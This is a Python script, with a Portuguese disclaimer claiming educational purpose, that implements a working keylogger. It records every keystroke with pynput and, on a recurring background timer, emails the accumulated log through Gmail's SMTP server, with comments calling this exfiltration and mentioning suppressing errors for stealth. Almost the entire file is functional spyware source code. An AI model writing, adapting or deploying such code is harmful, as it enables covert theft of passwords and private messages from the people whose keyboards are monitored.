"""
--------------------------------------------------------------------------------
AVISO LEGAL E USO ÉTICO
--------------------------------------------------------------------------------
Este script foi desenvolvido estritamente para fins EDUCACIONAIS e de PESQUISA 
em segurança cibernética. O objetivo é demonstrar o funcionamento técnico de 
ameaças para auxiliar na criação de medidas de defesa e conscientização.

O autor não se responsabiliza pelo uso indevido, ilegal ou danos causados por 
este código. O uso deste software contra sistemas sem autorização prévia e 
expressa é ILEGAL e punível por lei.

Sempre execute este código em ambientes isolados (Máquinas Virtuais ou Sandboxes).
--------------------------------------------------------------------------------
"""
import pynput.keyboard
import threading
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Keylogger:
    def __init__(self, interval_seconds, email, password):
        """
        Inicializa o Keylogger com intervalo de envio e credenciais.
        :param interval_seconds: Tempo em segundos entre cada envio de e-mail.
        :param email: E-mail do remetente/destinatário (Gmail).
        :param password: Senha de App do Gmail (16 dígitos).
        """
        self.log = "--- Keylogger Iniciado ---\n"
        self.interval = interval_seconds
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        """Trata a tecla pressionada e formata para o log."""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER]\n "
            else:
                current_key = " [" + str(key).replace("Key.", "") + "] "
        
        self.append_to_log(current_key)

    def send_mail(self, message):
        """Configura a conexão segura e envia o e-mail."""
        smtp_server = "smtp.gmail.com"
        port = 587
        
        # Criando o cabeçalho do e-mail
        email_msg = MIMEMultipart()
        email_msg["From"] = self.email
        email_msg["To"] = self.email
        email_msg["Subject"] = "Relatório de Atividade de Teclado"
        email_msg.attach(MIMEText(message, "plain"))

        context = ssl.create_default_context()
        try:
            with smtplib.SMTP(smtp_server, port) as server:
                server.starttls(context=context) # Camada de segurança
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, email_msg.as_string())
        except Exception as e:
            # Em um cenário real, o erro seria ignorado para manter a furtividade
            print(f"Falha na exfiltração: {e}")

    def report(self):
        """Envia o log acumulado e agenda o próximo envio."""
        if self.log:
            self.send_mail("\n\n" + self.log)
            self.log = "" # Limpa o log após o envio bem-sucedido
        
        # Cria um timer recursivo para rodar em background
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True # Garante que o timer morra se o script principal parar
        timer.start()

    def start(self):
        """Inicia o listener do teclado."""
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report() # Inicia o ciclo de relatórios
            keyboard_listener.join()

# --- CONFIGURAÇÃO DE TESTE ---
if __name__ == "__main__":
    # IMPORTANTE: Use uma 'Senha de App' do Google, não sua senha comum.
    # O intervalo de 60 segundos é para fins de teste rápido.
    EMAIL_TESTE = "seu-email@gmail.com"
    SENHA_APP = "abcd efgh ijkl mnop" 
    
    meu_keylogger = Keylogger(interval_seconds=60, email=EMAIL_TESTE, password=SENHA_APP)
    meu_keylogger.start()